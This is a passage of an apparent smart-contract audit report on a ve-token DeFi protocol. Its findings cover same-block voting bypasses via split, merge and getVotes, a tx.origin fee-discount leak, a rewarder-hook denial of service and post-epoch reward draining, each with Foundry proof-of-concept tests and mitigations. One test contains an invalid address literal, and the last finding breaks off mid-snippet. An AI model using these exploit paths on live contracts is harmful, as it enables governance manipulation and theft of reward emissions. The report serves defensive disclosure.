    function quoteFee(DynamicSwapFeeModule m, address p) external view returns (uint24) {
        return m.getFee(p);
    }
}

contract TxOriginDiscountLeakTest is Test {
    CLFactory factory;
    DynamicSwapFeeModule module_;
    MockPool pool;
    AttackerRouter router;
    address victim = address(0xBEEF);
    address other = address(0xCAFE);

    function setUp() public {
        factory = new CLFactory(address(0xdead));
        module_ = new DynamicSwapFeeModule(address(factory), 0, 500_000, new address[](0), new uint24[](0));
        pool = new MockPool();
        router = new AttackerRouter();
        assertEq(factory.tickSpacingToFee(200), 3000);
        // Only swapFeeManager can register discounts; factory constructor sets swapFeeManager = msg.sender (this test)
        module_.registerDiscounted(victim, 500_000); // 50%
    }

    function test_OriginLeakedDiscount() public {
        // Baseline: non-discounted origin => full base fee
        vm.prank(other, other); // set both msg.sender and tx.origin
        uint24 feeNo = router.quoteFee(module_, address(pool));

        // Discounted origin: router illegitimately inherits VIP discount via tx.origin
        vm.prank(victim, victim); // set both msg.sender and tx.origin
        uint24 feeYes = router.quoteFee(module_, address(pool));

        assertEq(uint256(feeNo), 3000, "baseline 0.3% fee");
        assertEq(uint256(feeYes), 1500, "router leaked 50% discount from tx.origin");
        assertGt(uint256(feeNo), uint256(feeYes));
    }
}


## Suggested Mitigation
Eliminate tx.origin from fee entitlement logic. Instead, pass the explicit payer/caller through the fee-query path:
- Extend IFeeModule with getFeeFor(address pool, address payer) and update CLFactory.getSwapFee to forward the payer: add ICLFactory.getSwapFeeFor(address pool, address payer).
- In CLPool, call factory.getSwapFeeFor(address(this), msg.sender) during swap/flash and have the fee module use discounted[payer] rather than discounted[tx.origin].
- If per-EOA discounts are desired, require the router to pass the user address explicitly (or sign a discount voucher) and validate it in-pool or factory; do not infer via tx.origin.
- As an immediate stopgap, disable per-account discounts (clear discounted mapping) until the interface refactor is shipped.





 **Derived From** : ownership_change[tokenId] == block.number => balanceOfNFT(tokenId) == 0

## [M-10]. Same-block transfer protection can be bypassed via split: mint new child NFTs without ownership_change and vote immediately

## Derived From Pattern/Invariant
ownership_change[tokenId] == block.number => balanceOfNFT(tokenId) == 0

## Exploit Type
FrontrunMev

## Location
VotingEscrow.multiSplit

## Minimim Privilege Required
Permissionless

## Description
After receiving a veNFT in the current block, the receiver can call multiSplit() to burn the transferred token and mint new child tokenIds. _mint does not set ownership_change[...] for newly minted NFTs, and balanceOfNFT(childId) does not check ownership_change for minted tokens. As a result, these fresh child tokenIds have full voting power in the same block, bypassing the intended same-block transfer protection tied to the original tokenId.

Key points:
- transferFrom sets ownership_change[oldId]=block.number.
- multiSplit burns oldId and mints N new tokenIds via _createSplitNFT() -> _checkpoint() -> _mint(); no ownership_change[...] write occurs on mint.
- Newly minted tokenIds immediately report positive balanceOfNFT and can vote in the same block.

## Impact
A recipient can restructure a just-received veNFT within the same block (via multiSplit) to mint fresh child tokenIds that retain full voting power immediately, bypassing the same-block transfer guard. This enables same-epoch vote manipulation and misallocation of emissions/bribes. The effect is protocol-value impacting but not direct asset theft.

## Proof of Concept
1) Governance enables split: toggleSplit(address(0), true).
2) Victim transfers veNFT A to attacker in block N (ownership_change[A] = N, so A cannot vote in N).
3) In the same block (e.g., via onERC721Received), attacker calls multiSplit(A, [w1, w2, ...]) which burns A and mints children C1..Ck.
4) Minted children do not set ownership_change[...] and thus immediately have positive balanceOfNFT in block N.
5) Attacker uses Ci to vote in the same block N, defeating the temporal anti-flash protection.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {VotingEscrow} from "ve33/contracts/VotingEscrow.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IERC20Like {
    function transfer(address,uint) external returns(bool);
    function transferFrom(address,address,uint) external returns(bool);
    function approve(address,uint) external returns(bool);
}

contract MockERC20 is IERC20Like {
    mapping(address=>uint) b; mapping(address=>mapping(address=>uint)) a;
    function mint(address u,uint x) external {b[u]+=x;}
    function transfer(address to,uint x) external returns(bool){require(b[msg.sender]>=x); b[msg.sender]-=x; b[to]+=x; return true;}
    function approve(address s,uint x) external returns(bool){a[msg.sender][s]=x; return true;}
    function transferFrom(address f,address t,uint x) external returns(bool){require(b[f]>=x && a[f][msg.sender]>=x); b[f]-=x; b[t]+=x; a[f][msg.sender]-=x; return true;}
}

contract MockArt { function _tokenURI(uint,uint,uint,uint) external pure returns (string memory){return "";} }

contract ReceiverDoSplit is IERC721Receiver {
    VotingEscrow public ve; uint[] public lastIds;
    constructor(VotingEscrow _ve){ve=_ve;}
    function onERC721Received(address, address, uint tokenId, bytes calldata) external override returns (bytes4){
        uint[] memory amts = new uint[](2); amts[0]=1; amts[1]=1;
        lastIds = ve.multiSplit(tokenId, amts);
        return this.onERC721Received.selector;
    }
}

contract SameBlockSplitBypassTest is Test {
  VotingEscrow ve; MockERC20 t; MockArt art; address alice=address(0xA11CE);

  function setUp() public {
    t=new MockERC20(); art=new MockArt();
    ve=new VotingEscrow(address(t), address(art));
    t.mint(alice, 1e24);
    vm.prank(alice); t.approve(address(ve), type(uint).max);
  }

  function testSplitBypassSameBlock() public {
    // enable global split permission (typical via script)
    ve.toggleSplit(address(0), true);

    vm.startPrank(alice);
    uint aId = ve.create_lock(1e21, 4 weeks);
    ReceiverDoSplit r = new ReceiverDoSplit(ve);

    // Transfer A to receiver; on receive it splits A into 2 children in the same block
    ve.safeTransferFrom(alice, address(r), aId);

    // Original A has zero power due to same-block transfer gate
    assertEq(ve.balanceOfNFT(aId), 0);

    // Newly minted children have immediate voting power in the same block (bypass)
    uint c0 = r.lastIds(0); uint c1 = r.lastIds(1);
    assertGt(ve.balanceOfNFT(c0), 0);
    assertGt(ve.balanceOfNFT(c1), 0);

    vm.stopPrank();
  }
}


## Suggested Mitigation
Propagate same-block taint to any tokens derived from a tainted token. Concretely: (a) In _createSplitNFT, set ownership_change[newChildId] = block.number so split-minted NFTs cannot vote in their minting block. (b) In merge, if ownership_change[_from] == block.number, also set ownership_change[_to] = block.number, preventing immediate voting via merging tainted weight into an existing token. This closes both split and merge-based bypass paths while preserving normal behavior for routine operations. Optionally, if stricter policy is acceptable, set ownership_change on any _mint (new locks) as well, so freshly created locks also cannot vote in their creation block.


## [M-11]. DAO voting path ignores same-block zero: getVotes/getPastVotes compute weight without ownership_change guard

## Derived From Pattern/Invariant
ownership_change[tokenId] == block.number => balanceOfNFT(tokenId) == 0

## Exploit Type
TimestampDependentLogic

## Location
VotingEscrow.getVotes

## Minimim Privilege Required
Permissionless

## Description
The same-block protection is enforced only in balanceOfNFT(), not in the governance vote path. getVotes() and getPastVotes() sum VotingBalanceLogic.balanceOfNFT(...) directly, which does not check ownership_change[tokenId]. After a same-block transfer, the new owner’s getVotes() includes the full weight of the transferred tokenIds in the same block, enabling immediate DAO voting power contrary to the temporal invariant.

Relevant code:
function getVotes(address account) external view returns (uint) {
  ...
  for (...) {
    votes = votes + VotingBalanceLogic.balanceOfNFT(tId, block.timestamp, votingBalanceLogicData);
  }
}
// No ownership_change check here (unlike balanceOfNFT)


## Impact
After a same-block transfer of a veNFT, the recipient immediately gains full DAO voting power through getVotes/getPastVotes because these functions sum VotingBalanceLogic.balanceOfNFT without honoring the same-block protection used by balanceOfNFT(). This enables same-block (flash) voting to meet proposal thresholds or cast votes without waiting a block, potentially skewing governance outcomes for any Governor relying on IHybraVotes. No direct asset theft path is implied, but governance decisions and value distribution that depend on voting can be influenced.

## Proof of Concept
Scenario:
- Alice owns a large veNFT and transfers it to Attacker in the same block.
- VotingEscrow._transferFrom updates ownership_change[tokenId] = block.number.
- balanceOfNFT(tokenId) returns 0 for this block due to the guard, but getVotes(attacker) iterates cpData and directly calls VotingBalanceLogic.balanceOfNFT, which ignores ownership_change. As a result, attacker’s getVotes includes the full weight immediately in the same block.
- If a governance module (Governor) uses IHybraVotes.getVotes/getPastVotes for thresholds/snapshots, the attacker can vote or meet proposal thresholds without waiting a block.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {VotingEscrow} from "contracts/VotingEscrow.sol";

interface IERC20Like { function transfer(address,uint) external returns(bool); function transferFrom(address,address,uint) external returns(bool); function approve(address,uint) external returns(bool); }

contract MockERC20 is IERC20Like {
    mapping(address=>uint) b; mapping(address=>mapping(address=>uint)) a;
    function mint(address u,uint x) external {b[u]+=x;}
    function transfer(address to,uint x) external returns(bool){require(b[msg.sender]>=x); b[msg.sender]-=x; b[to]+=x; return true;}
    function approve(address s,uint x) external returns(bool){a[msg.sender][s]=x; return true;}
    function transferFrom(address f,address t,uint x) external returns(bool){require(b[f]>=x && a[f][msg.sender]>=x); b[f]-=x; b[t]+=x; a[f][msg.sender]-=x; return true;}
}

contract MockArt { function _tokenURI(uint,uint,uint,uint) external pure returns (string memory){return "";} }

contract SameBlockGetVotesBypassTest is Test {
  VotingEscrow ve; MockERC20 t; MockArt art; address alice=address(0xA11CE); address attacker=address(0xBEEF);

  function setUp() public {
    t = new MockERC20();
    art = new MockArt();
    ve = new VotingEscrow(address(t), address(art));
    t.mint(alice, 1e24);
    vm.prank(alice);
    t.approve(address(ve), type(uint).max);
  }

  function testGetVotes_IgnoresSameBlockGuard() public {
    vm.startPrank(alice);
    uint id = ve.create_lock(1e21, 4 weeks);
    // Optional: ensure a checkpoint exists (mint already did add to cpData)
    vm.stopPrank();

    // same-block transfer to attacker
    vm.prank(alice);
    ve.safeTransferFrom(alice, attacker, id);

    // balanceOfNFT(id) correctly 0 in same block due to ownership_change guard
    assertEq(ve.balanceOfNFT(id), 0, "guard not applied in balanceOfNFT");

    // But getVotes(attacker) incorrectly includes the transferred power
    uint vNow = ve.getVotes(attacker);
    assertGt(vNow, 0, "getVotes should exclude same-block transferred power but it doesn't");

    // getPastVotes at current timestamp also includes it
    uint vPast = ve.getPastVotes(attacker, block.timestamp);
    assertGt(vPast, 0, "getPastVotes should exclude same-block transferred power but it doesn't");
  }
}


## Suggested Mitigation
Align governance vote calculations with the same-block guard. Minimal fix for current votes:
- In getVotes(), skip tokenIds whose ownership_change[tokenId] == block.number.

For parity with getPastVotes (which uses timestamps):
- Add a new mapping ownership_change_ts[tokenId] set in _transferFrom() to block.timestamp.
- In getPastVotes(account, timestamp), skip tokenIds where ownership_change_ts[tokenId] == timestamp (same-block-as-snapshot case).

Alternatively, reuse the contract’s wrapper for current balance (expose an internal helper mirroring balanceOfNFT’s guard) when summing per-token votes. Example patch:

// state
mapping(uint => uint) public ownership_change_ts; // set alongside ownership_change

// in _transferFrom(...)
ownership_change[_tokenId] = block.number;
ownership_change_ts[_tokenId] = block.timestamp;

// in getVotes(...)
for (uint i=0; i<_tokenIds.length; ++i) {
  uint tId = _tokenIds[i];
  if (ownership_change[tId] == block.number) continue; // enforce same-block zero
  votes += VotingBalanceLogic.balanceOfNFT(tId, block.timestamp, votingBalanceLogicData);
}

// in getPastVotes(..., uint timestamp)
for (uint i=0; i<_tokenIds.length; ++i) {
  uint tId = _tokenIds[i];
  if (ownership_change_ts[tId] == timestamp) continue; // same-block snapshot
  votes += VotingBalanceLogic.balanceOfNFT(tId, timestamp, votingBalanceLogicData);
}

This restores the documented temporal invariant for governance vote paths and prevents same-block flash voting.


## [M-12]. Same-block transfer protection can be bypassed via merge: migrate weight into an existing token and vote immediately

## Derived From Pattern/Invariant
ownership_change[tokenId] == block.number => balanceOfNFT(tokenId) == 0

## Exploit Type
FrontrunMev

## Location
VotingEscrow.merge

## Minimim Privilege Required
Permissionless

## Description
The same-block zero-power rule is only enforced for the tokenId that changed owners (checked in VotingEscrow.balanceOfNFT). After receiving a veNFT in the current block (ownership_change[tokenId]=block.number), an attacker can merge it into another veNFT they already own (token B). merge() increases B’s locked amount but does not update ownership_change[B]. Therefore, in the same block, balanceOfNFT(B) reflects the combined weight and can be used to vote/claim, bypassing the intended same-block transfer protection.

Vulnerable flow:
- safeTransferFrom sets ownership_change[fromId] = block.number before onERC721Received.
- onERC721Received (reentrancy) or any same-block tx then calls merge(fromId, toId) owned by the receiver.
- toId’s ownership did not change this block, so balanceOfNFT(toId) > 0 immediately; protection is circumvented.

Snippet (merge does not touch ownership_change[toId]):
function merge(uint _from, uint _to) external {
  ...
  locked[_from] = IVotingEscrow.LockedBalance(0,0,false);
  _checkpoint(_from, _locked0, IVotingEscrow.LockedBalance(0,0,false));
  _burn(_from);
  ...
  _checkpoint(_to, _locked1, newLockedTo);
  locked[_to] = newLockedTo;
  ...
}


## Impact
Immediate reuse of newly acquired voting power in the same block to influence gauge votes/bribe distribution; undermines temporal safety and can swing epoch allocations.

## Proof of Concept
Simplified same-block bypass without reentrancy:
1) Attacker owns veNFT B from a prior block (or minted to attacker; _mint does not set ownership_change).
2) Alice owns veNFT A.
3) In a single block:
   - Alice calls safeTransferFrom(Alice -> Attacker, A). This sets ownership_change[A] = block.number, so A has zero voting power this block.
   - Still in the same block, Attacker calls merge(A, B).
4) Because B did not change ownership this block and merge() does not update ownership_change[B], balanceOfNFT(B) immediately reflects A+B power in the same block.
5) Attacker can now call Voter.vote with B in the same block to use the freshly added voting power, bypassing the intended same-block transfer guard.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {VotingEscrow} from "ve33/contracts/VotingEscrow.sol";

interface IERC20Like { function transfer(address,uint) external returns(bool); function transferFrom(address,address,uint) external returns(bool); function approve(address,uint) external returns(bool); }

contract MockERC20 is IERC20Like {
    mapping(address=>uint) b; mapping(address=>mapping(address=>uint)) a;
    function mint(address u,uint x) external { b[u]+=x; }
    function transfer(address to,uint x) external returns(bool){ require(b[msg.sender]>=x); b[msg.sender]-=x; b[to]+=x; return true; }
    function approve(address s,uint x) external returns(bool){ a[msg.sender][s]=x; return true; }
    function transferFrom(address f,address t,uint x) external returns(bool){ require(b[f]>=x && a[f][msg.sender]>=x); b[f]-=x; b[t]+=x; a[f][msg.sender]-=x; return true; }
}

contract MockArt { function _tokenURI(uint,uint,uint,uint) external pure returns (string memory){ return ""; } }

contract SameBlockMergeBypassTest is Test {
    VotingEscrow ve; MockERC20 token; MockArt art;
    address alice = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        token = new MockERC20();
        art = new MockArt();
        ve = new VotingEscrow(address(token), address(art));
        token.mint(alice, 1e24);
        token.mint(attacker, 1e24);
        vm.prank(alice); token.approve(address(ve), type(uint).max);
        vm.prank(attacker); token.approve(address(ve), type(uint).max);
    }

    function testSameBlockMergeBypassesOwnershipChangeGuard() public {
        // Attacker already has veNFT B (no transfer this block)
        vm.startPrank(attacker);
        uint bId = ve.create_lock(1e21, 4 weeks);
        vm.stopPrank();

        // Alice has veNFT A
        vm.startPrank(alice);
        uint aId = ve.create_lock(1e21, 4 weeks);
        vm.stopPrank();

        // In the same block: transfer A to attacker (A is tainted this block)
        vm.prank(alice);
        ve.safeTransferFrom(alice, attacker, aId);

        // Verify A has zero power this block due to ownership_change
        uint aBalNow = ve.balanceOfNFT(aId);
        assertEq(aBalNow, 0, "A should have zero power in transfer block");

        // Record B's balance before merge (B not tainted)
        uint bBalBefore = ve.balanceOfNFT(bId);
        assertGt(bBalBefore, 0, "B should have initial power");

        // Still same block: attacker merges A -> B
        vm.prank(attacker);
        ve.merge(aId, bId);

        // B immediately reflects combined power in the same block (bypass)
        uint bBalAfter = ve.balanceOfNFT(bId);
        assertGt(bBalAfter, bBalBefore, "B should gain A's power in same block (bypass)");
    }
}


## Suggested Mitigation
Propagate the same-block taint on merges so newly acquired voting power cannot be used immediately via another token. In merge(uint _from, uint _to):
- Read bool tainted = (ownership_change[_from] == block.number) || (ownership_change[_to] == block.number);
- After updating locked[_to], set ownership_change[_to] = block.number if tainted (or unconditionally, to be stricter).
This ensures balanceOfNFT(_to) returns 0 in the current block whenever either leg changed ownership or a tainted source contributed power. Consider similar propagation for split/multiSplit if you want uniform semantics across intra-block structural changes.





 **Derived From** : Untrusted rewarder hook can brick deposit/withdraw/harvest (no try/catch)

## [M-13]. GaugeV2’s unguarded rewarder hook can revert and brick deposits, withdrawals, and harvests

## Derived From Pattern/Invariant
Untrusted rewarder hook can brick deposit/withdraw/harvest (no try/catch)

## Exploit Type
Dos

## Location
GaugeV2._deposit

## Minimim Privilege Required
RequireAdminRole

## Description
GaugeV2 performs an external call to a configurable rewarder on every deposit/withdraw/harvest without try/catch. Any revert in the rewarder DoS’s core user flows, effectively locking funds until governance changes the rewarder or enables emergency mode. Vulnerable snippets:

// _deposit
if (address(gaugeRewarder) != address(0)) {
    IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));
}

// _withdraw
if (address(gaugeRewarder) != address(0)) {
    IRewarder(gaugeRewarder).onReward(msg.sender, msg.sender, _balanceOf(msg.sender));
}

// getReward (both)
if (gaugeRewarder != address(0)) {
    IRewarder(gaugeRewarder).onReward(...);
}

Because these calls are in hot user paths and lack failure isolation, a misconfigured/malicious or later-upgraded rewarder can revert and brick deposits, withdrawals, and reward claims.

## Impact
A reverting gaugeRewarder bricks core user flows (deposit, withdraw, and getReward) for all users because onReward is called unguarded in those hot paths. Until the owner replaces the rewarder or toggles emergency mode, users cannot withdraw or harvest, effectively trapping funds (availability DoS). No funds are lost, but availability is blocked and requires centralized intervention to resolve.

## Proof of Concept
1) Admin sets gaugeRewarder to a reverting rewarder (or a legit rewarder later upgraded to revert).
2) Any user calling deposit/withdraw/getReward hits the external onReward and reverts.
3) Users cannot withdraw their LPs or harvest rewards until admin replaces the rewarder or toggles emergency mode.
4) Blast radius: affects every caller of the gauge’s hot paths.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {GaugeV2, IRewarder} from "../contracts/GaugeV2.sol";
import {HYBR} from "../contracts/HYBR.sol";

contract RevertingRewarder is IRewarder {
    function onReward(address, address, uint256) external pure override {
        revert("rewarder revert");
    }
}

contract GaugeV2RewarderHookDoS is Test {
    GaugeV2 gauge;
    HYBR token;
    address alice = address(0xA11CE);

    function setUp() public {
        token = new HYBR();
        token.mint(alice, 100 ether); // this test contract is initial HYBR minter
        // rewardToken=token, rHYBR=dead, ve=0, TOKEN=token, distribution=this, bribes=0, isForPair=false
        gauge = new GaugeV2(address(token), address(0xdead), address(0), address(token), address(this), address(0), address(0), false);
        vm.startPrank(alice);
        token.approve(address(gauge), type(uint256).max);
        vm.stopPrank();
    }

    function test_DepositReverts_WhenRewarderReverts() public {
        gauge.setGaugeRewarder(address(new RevertingRewarder()));
        vm.prank(alice);
        vm.expectRevert(bytes("rewarder revert"));
        gauge.deposit(1 ether);
    }

    function test_WithdrawReverts_WhenRewarderReverts() public {
        vm.prank(alice);
        gauge.deposit(1 ether);
        gauge.setGaugeRewarder(address(new RevertingRewarder()));
        vm.prank(alice);
        vm.expectRevert(bytes("rewarder revert"));
        gauge.withdraw(1 ether);
    }

    function test_GetRewardReverts_WhenRewarderReverts() public {
        vm.prank(alice);
        gauge.deposit(1 ether);
        gauge.setGaugeRewarder(address(new RevertingRewarder()));
        vm.prank(alice);
        vm.expectRevert(bytes("rewarder revert"));
        gauge.getReward(uint8(0));
    }
}


## Suggested Mitigation
Wrap the external rewarder hook in try/catch and fail open by default so core flows cannot be bricked by a misbehaving rewarder. Example:

// after updating internal accounting
if (gaugeRewarder != address(0)) {
    try IRewarder(gaugeRewarder).onReward(user, recipient, _balanceOf(user)) {} catch {
        emit RewarderHookFailed(gaugeRewarder, user);
    }
}

Additional hardening: (1) Add an owner toggle to choose fail-open vs fail-closed if governance wants strict semantics; (2) In deposit, consider invoking the hook after a successful TOKEN.safeTransferFrom to avoid needless external calls on would-be reverts; (3) Validate rewarder is a contract address when setting it and optionally use an allowlist of vetted implementations.





 **Derived From** : _periodFinish == HybraTimeLibrary.epochNext(block.timestamp) && rewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] == rewardRate

## [H-14]. Post-epoch streaming leak: GaugeCL streams rollover rewards after periodFinish before new notify

## Derived From Pattern/Invariant
_periodFinish == HybraTimeLibrary.epochNext(block.timestamp) && rewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] == rewardRate

## Exploit Type
TimestampDependentLogic

## Location
GaugeCL._earned

## Minimim Privilege Required
Permissionless

## Description
GaugeCL._earned simulates extra reward growth using block.timestamp - clPool.lastUpdated without clamping to the pool's periodFinish. After an epoch ends (block.timestamp > _periodFinish) but before the next notifyRewardAmount, _updateRewards() first calls clPool.updateRewardsGrowthGlobal() (which typically clamps lastUpdated to min(block.timestamp, periodFinish)). Then _earned recalculates a synthetic rewardGrowthGlobalX128 as:

uint256 timeDelta = block.timestamp - lastUpdated;
uint256 reward = rewardRate * timeDelta;
if (reward > rewardReserve) reward = rewardReserve;
rewardGrowthGlobalX128 += reward * Q128 / stakedLiquidity;

Because there is no periodFinish clamp here, any positive rollover (rewardReserve > 0) will be streamed in the gap (now - periodFinish) at the old rewardRate. Attackers can deposit just after period end and withdraw before the next notify to siphon from rollover that should be distributed in the next epoch, violating the temporal invariant that rewards align strictly to epochs.

## Impact
After an epoch ends (block.timestamp > periodFinish) and before the next notifyRewardAmount, GaugeCL._earned simulates additional global reward growth using now - clPool.lastUpdated without clamping to the ended period. If clPool.rewardReserve > 0 (rollover), any address can deposit a large-liquidity NFT during this gap and withdraw moments later to harvest rewards at the previous epoch’s rewardRate, capped by rewardReserve. With a sufficiently long notify delay, the attacker can drain up to the entire rollover intended for the next epoch. This steals real emission tokens from future distribution and breaks per-epoch accounting.

## Proof of Concept
Step-by-step exploit (key nuances included):
- Precondition: A prior epoch has ended; clPool.updateRewardsGrowthGlobal() clamps lastUpdated to periodFinish. There is positive rollover (rewardReserve > 0) left in the pool/gauge treasury; the Gauge has the HYBR balance from the last notify.
- 1) Distributor notifies at epoch start as normal; rewardRate and _periodFinish are set to the end of the epoch.
- 2) After periodFinish and before the next notifyRewardAmount call, an attacker waits until block.timestamp > _periodFinish.
- 3) Attacker deposits a high-liquidity NFT into GaugeCL. This sets their baseline rewardGrowthInside to 0.
- 4) Advance time at least 1 second after deposit (to avoid _updateRewards early-return due to lastUpdateTime[tokenId] == block.timestamp).
- 5) Attacker withdraws immediately. During withdraw -> _getReward -> _updateRewards: clPool.updateRewardsGrowthGlobal() leaves lastUpdated at periodFinish. GaugeCL._earned then computes timeDelta = now - periodFinish and synthetically adds rewardRate * timeDelta (capped by rewardReserve) to rewardGrowthGlobalX128, distributing it pro-rata to the attacker’s liquidity.
- 6) Gauge approves and transfers HYBR to rHYBR and then to the attacker, draining rollover that should have been preserved for the next epoch. Repeating or prolonging the notify delay increases the drained amount up to rewardReserve.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeCL} from "ve33/contracts/CLGauge/GaugeCL.sol";
import {HybraTimeLibrary} from "ve33/contracts/libraries/HybraTimeLibrary.sol";
import {INonfungiblePositionManager} from "ve33/contracts/interfaces/INonfungiblePositionManager.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {HYBR} from "ve33/contracts/HYBR.sol";

contract MockCLPool {
    uint256 public lastUpdated;
    uint256 public rewardReserve_;
    uint256 public rewardGrowthGlobalX128_;
    uint256 public stakedLiquidity_;
    uint256 public periodFinish;

    function updateRewardsGrowthGlobal() external {
        if (block.timestamp > lastUpdated) {
            uint256 lu = block.timestamp < periodFinish ? block.timestamp : periodFinish;
            lastUpdated = lu;
        }
    }
    function getRewardGrowthInside(int24, int24, uint256 rewardGrowthGlobalX) external view returns (uint256) {
        // passthrough: GaugeCL supplies the synthetic global when needed
        return rewardGrowthGlobalX;
    }
    function stakedLiquidity() external view returns (uint256) { return stakedLiquidity_; }
    function rewardReserve() external view returns (uint256) { return rewardReserve_; }
    function lastUpdated() external view returns (uint256) { return lastUpdated; }
    function rewardGrowthGlobalX128() external view returns (uint256) { return rewardGrowthGlobalX128_; }
    function stake(int128 liqDelta, int24, int24, bool) external {
        if (liqDelta > 0) stakedLiquidity_ += uint128(liqDelta);
        else stakedLiquidity_ -= uint128(-liqDelta);
    }
    function syncReward(uint256 /*_rate*/, uint256 _reserve, uint256 _finish) external {
        rewardReserve_ = _reserve;
        periodFinish = _finish;
        if (lastUpdated == 0) lastUpdated = block.timestamp;
    }
    function rollover() external view returns (uint256) { return 0; }
    // Unused by test but required by GaugeCL
    function gaugeFees() external view returns (uint256, uint256) { return (0, 0); }
    function collectFees() external { }
    function token0() external view returns (address) { return address(0); }
    function token1() external view returns (address) { return address(0); }
}

contract MockFactory {
    address public pool;
    constructor(address _pool) { pool = _pool; }
    function getPool(address, address, int24) external view returns (address) { return pool; }
}

contract MockNFPM is INonfungiblePositionManager {
    struct P { address token0; address token1; int24 tickSpacing; int24 lower; int24 upper; uint128 liq; }
    P public pos;
    address public factoryAddr;
    constructor(address _factory) { factoryAddr = _factory; }
    function setPosition(address t0, address t1, int24 ts, int24 lo, int24 up, uint128 liq) external {
        pos = P(t0, t1, ts, lo, up, liq);
    }
    function positions(uint256) external view override returns (
        uint96, address, address, address, int24, int24, int24, uint128, uint256, uint256, uint128, uint128
    ) {
        return (0, address(0), pos.token0, pos.token1, pos.tickSpacing, pos.lower, pos.upper, pos.liq, 0, 0, 0, 0);
    }
    function factory() external view override returns (address) { return factoryAddr; }
    function collect(CollectParams calldata) external override returns (uint256, uint256) { return (0, 0); }
    function safeTransferFrom(address, address, uint256) external override { }
    // Unused interface functions
    function tokenDescriptor() external view override returns (address) { return address(0); }
    function owner() external view override returns (address) { return address(0); }
    function tokenURI(uint256) external view override returns (string memory) { return ""; }
    function totalSupply() external view override returns (uint256) { return 0; }
    function balanceOf(address) external view override returns (uint256) { return 0; }
    function ownerOf(uint256) external view override returns (address) { return address(0); }
    function approve(address, uint256) external override { }
    function getApproved(uint256) external view override returns (address) { return address(0); }
    function setApprovalForAll(address, bool) external override { }
    function isApprovedForAll(address, address) external view override returns (bool) { return false; }
    function transferFrom(address, address, uint256) external override { }
    function safeTransferFrom(address, address, uint256, bytes calldata) external override { }
}

contract MockRHYBR {
    address public immutable rewardToken;
    constructor(address rt) { rewardToken = rt; }
    function depostionEmissionsToken(uint256 amount) external {
        IERC20(rewardToken).transferFrom(msg.sender, address(this), amount);
    }
    function redeemFor(uint256 amount, uint8, address recipient) external {
        IERC20(rewardToken).transfer(recipient, amount);
    }
}

contract GaugeCL_TemporalLeak_Test is Test {
    HYBR internal token;
    MockRHYBR internal rh;
    MockCLPool internal pool;
    MockFactory internal fact;
    MockNFPM internal nfpm;
    GaugeCL internal gauge;
    address internal manager = address(0xD1);
    address internal attacker = address(0xA11CE);

    function setUp() public {
        token = new HYBR();
        rh = new MockRHYBR(address(token));
        pool = new MockCLPool();
        fact = new MockFactory(address(pool));
        nfpm = new MockNFPM(address(fact));
        // arbitrary params with non-zero liquidity
        nfpm.setPosition(address(0x1), address(0x2), int24(60), int24(-300), int24(300), uint128(1_000_000));
        gauge = new GaugeCL(address(token), address(rh), address(0xVE), address(pool), manager, address(0), address(0), true, address(nfpm), address(0));
        token.mint(manager, 1e24);
    }

    function testLeakAfterPeriodFinish() public {
        // 1) Manager notifies at epoch start
        vm.warp(3600);
        uint256 next = HybraTimeLibrary.epochNext(block.timestamp);
        uint256 amt = 1e21;
        vm.startPrank(manager);
        token.approve(address(gauge), amt);
        gauge.notifyRewardAmount(address(token), amt);
        vm.stopPrank();

        // 2) Warp to just after periodFinish, before next notify
        vm.warp(next + 100);

        // 3) Attacker deposits a CL NFT
        vm.prank(attacker);
        gauge.deposit(1);

        // 4) Move forward 1s to avoid _updateRewards early-return, then withdraw immediately
        vm.warp(block.timestamp + 1);
        uint256 balBefore = token.balanceOf(attacker);
        vm.prank(attacker);
        gauge.withdraw(1, 0);
        uint256 balAfter = token.balanceOf(attacker);

        // Attacker received post-epoch streamed HYBR taken from rollover
        assertGt(balAfter, balBefore, "expected post-epoch leak");
    }
}


## Suggested Mitigation
Clamp or remove synthetic accrual in GaugeCL._earned:
- Preferred: remove the manual timeDelta-based growth and rely solely on pool aggregation. After clPool.updateRewardsGrowthGlobal(), compute rewards using clPool.getRewardGrowthInside(tickLower, tickUpper, 0) against the stored baseline. This ensures no accrual occurs past the pool’s internal period finish.
- Alternatively: bound timeDelta to the current period end. For example:
  uint256 lu = clPool.lastUpdated();
  uint256 cappedNow = block.timestamp < _periodFinish ? block.timestamp : _periodFinish;
  if (cappedNow > lu) { timeDelta = cappedNow - lu; ... }
This prevents any reward streaming after the epoch boundary while preserving intended in-epoch accrual. If _periodFinish can drift from the pool’s, expose periodFinish on the pool and clamp against that instead.


## [M-15]. Epoch-end notify creates 1-second emission spike enabling MEV ‘flash-stake’ to steal a full epoch’s rewards

## Derived From Pattern/Invariant
_periodFinish == HybraTimeLibrary.epochNext(block.timestamp) && rewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] == rewardRate

## Exploit Type
FrontrunMev

## Location
GaugeCL.notifyRewardAmount

## Minimim Privilege Required
Permissionless

## Description
GaugeCL.notifyRewardAmount sets rewardRate = rewardAmount / (epochNext(now) - now). If GaugeManager calls near the epoch end (e.g., 1s left), the entire epoch’s rewardAmount is streamed in that final second. An attacker can mempool-listen and deposit a large-liquidity CL NFT immediately after notify, then withdraw 1s later to capture nearly the whole epoch’s emissions with negligible exposure time. The code aligns periodFinish to epochNext and snapshots rewardRateByEpoch, but does not prevent late-epoch calls that compress the stream into a tiny window.

Vulnerable snippet:

function notifyRewardAmount(...) {
  ...
  uint256 epochTimeRemaining = HybraTimeLibrary.epochNext(block.timestamp) - block.timestamp;
  ...
  if (block.timestamp >= _periodFinish) {
      rewardRate = rewardAmount / epochTimeRemaining; // huge if ~1s left
      clPool.syncReward({ rewardRate: rewardRate, rewardReserve: totalRewardAmount, periodFinish: epochEndTimestamp });
  } else {
      uint256 pendingRewards = epochTimeRemaining * rewardRate;
